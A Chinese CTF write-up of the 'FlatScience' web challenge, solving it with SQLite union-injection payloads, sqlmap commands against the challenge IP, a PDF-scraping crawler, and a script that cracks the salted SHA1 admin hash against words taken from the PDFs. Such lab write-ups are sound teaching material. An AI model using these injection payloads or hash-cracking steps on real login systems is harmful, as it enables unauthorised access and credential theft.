---
layout:     post               # 使用的布局（不需要改）
title:     FlatScience    # 标题 
subtitle:    攻防世界  #副标题
date:       2020-07-28        # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
---

扫描发现，同样robots.txt里也是`admin.php`和`login.php`

![ak0dNd.png](https://s1.ax1x.com/2020/07/28/ak0dNd.png)

`admin.php`，爆破不出来，并且没报错都一个样。源代码还提示

	<!-- do not even try to bypass this -->

所以从`login.php`入手。

右键源代码发现

	<!-- TODO: Remove ?debug-Parameter! -->

增加个参数看看有啥效果。`/login.php?debug`

发现源码回显。

```
<?php
ob_start();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">

<html>
<head>
<style>
blockquote { background: #eeeeee; }
h1 { border-bottom: solid black 2px; }
h2 { border-bottom: solid black 1px; }
.comment { color: darkgreen; }
</style>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Login</title>
</head>
<body>


<div align=right class=lastmod>
Last Modified: Fri Mar  31:33:7 UTC 1337
</div>

<h1>Login</h1>

Login Page, do not try to hax here plox!<br>


<form method="post">
  ID:<br>
  <input type="text" name="usr">
  <br>
  Password:<br> 
  <input type="text" name="pw">
  <br><br>
  <input type="submit" value="Submit">
</form>

<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
<!-- TODO: Remove ?debug-Parameter! -->




<hr noshade>
<address>Flux Horst (Flux dot Horst at rub dot flux)</address>
</body>
```

很显然存在注入。

**手工注入**

ID处输入`1'`,报错，并且知道这是sqlite数据库。

	Warning: SQLite3::query(): Unable to prepare statement: 1, near "' and password='": syntax error in /var/www/html/login.php on line 47

注意： Password处也不能空着，得随意输入即可。

`1' --+`,不报错，说明闭合方式确定了。

`1' order by 3 --+`报错，`1' order by 2 --+`不报错，说明字段是2，这里看源码也可以看出字段是2.

![akg4XR.png](https://s1.ax1x.com/2020/07/28/akg4XR.png)

`1' union select 1,2 --+`发现cookie处回显+2.

`1' union select name,sql from sqlite_master--+`得到

	+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29

也就是

```
CREATE TABLE Users(
id int primary key,
name varchar(255),
password varchar(255),
hint varchar(255)
)
```


![ak2gbt.png](https://s1.ax1x.com/2020/07/28/ak2gbt.png)

ps： sqlite数据库有一张sqlite_master表，里面有type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息

`1' union select id,group_concat(id) from users--+`得到1，2，3

`1' union select id,group_concat(name) from users--+`得到admin,fritze,hansi

`1' union select id,group_concat(password) from users--+`得到3fab54a50e770d830c0416df817567662a9dc85c、54eae8935c90f467427f05e4ece82cf569f89507、34b0bb7c304949f9ff2fc101eef0f048be10d3bd

`1' union select id,group_concat(hint) from users--+`得到
my fav word in my fav paper?!、my love isâ¦?、the password is password

整合一下

```
 id  hint                           name    password                                 
 1   my fav word in my fav paper?!  admin   3fab54a50e770d830c0416df817567662a9dc85c 
 2   my love isâ¦?              fritze   54eae8935c90f467427f05e4ece82cf569f89507 
 3   the password is password       hansi   34b0bb7c304949f9ff2fc101eef0f048be10d3bd 

```

#### sqlmap

sqlmap也可以跑出来。

```
python2 sqlmap.py -u http://220.249.52.133:46876/login.php "--data=usr=1&p
w=1" --batch --tables

python2 sqlmap.py -u http://220.249.52.133:46876/login.php "--data=usr=1&p
w=1" --batch -T Users --columns

python2 sqlmap.py -u http://220.249.52.133:46876/login.php "--data=usr=1&p
w=1" --batch -T Users --dump
```

密码被加密`sha1($pass."Salz!")`,根据提示，密码会不会藏在pdf中

找脚本跑：

安装模块

	pip3 install pdfminer.six

python3爬取多目标网页PDF文件并下载到指定目录：

```
import requests
import re
import os
import sys

re1 = '[a-fA-F0-9]{32,32}.pdf'
re2 = '[0-9\/]{2,2}index.html'

pdf_list = []
def get_pdf(url):
    global pdf_list 
    print(url)
    req = requests.get(url).text
    re_1 = re.findall(re1,req)
    for i in re_1:
        pdf_url = url+i
        pdf_list.append(pdf_url)
    re_2 = re.findall(re2,req)
    for j in re_2:
        new_url = url+j[0:2]
        get_pdf(new_url)
    return pdf_list
    # return re_2

pdf_list = get_pdf('http://220.249.52.133:46876/')
print(pdf_list)
for i in pdf_list:
    os.system('wget '+i)
```

python3识别PDF内容并进行密码对冲

```
from io import StringIO

#python3
from pdfminer.pdfpage import PDFPage
from pdfminer.converter import TextConverter
from pdfminer.converter import PDFPageAggregator
from pdfminer.layout import LTTextBoxHorizontal, LAParams
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter


import sys
import string
import os
import hashlib
import importlib
import random
from urllib.request import urlopen
from urllib.request import Request


def get_pdf():
    return [i for i in os.listdir("./") if i.endswith("pdf")]
 
 
def convert_pdf_to_txt(path_to_file):
    rsrcmgr = PDFResourceManager()
    retstr = StringIO()
    codec = 'utf-8'
    laparams = LAParams()
    device = TextConverter(rsrcmgr, retstr, codec=codec, laparams=laparams)
    fp = open(path_to_file, 'rb')
    interpreter = PDFPageInterpreter(rsrcmgr, device)
    password = ""
    maxpages = 0
    caching = True
    pagenos=set()

    for page in PDFPage.get_pages(fp, pagenos, maxpages=maxpages, password=password,caching=caching, check_extractable=True):
        interpreter.process_page(page)

    text = retstr.getvalue()

    fp.close()
    device.close()
    retstr.close()
    return text
 
 
def find_password():
    pdf_path = get_pdf()
    for i in pdf_path:
        print ("Searching word in " + i)
        pdf_text = convert_pdf_to_txt("./"+i).split(" ")
        for word in pdf_text:
            sha1_password = hashlib.sha1(word.encode('utf-8')+'Salz!'.encode('utf-8')).hexdigest()
            if (sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c'):
                print ("Find the password :" + word)
                exit()
            
 
if __name__ == "__main__":
    find_password()
```

成功得到。`ThinJerboa`

![aAdm6K.png](https://s1.ax1x.com/2020/07/28/aAdm6K.png)

登录获得falg.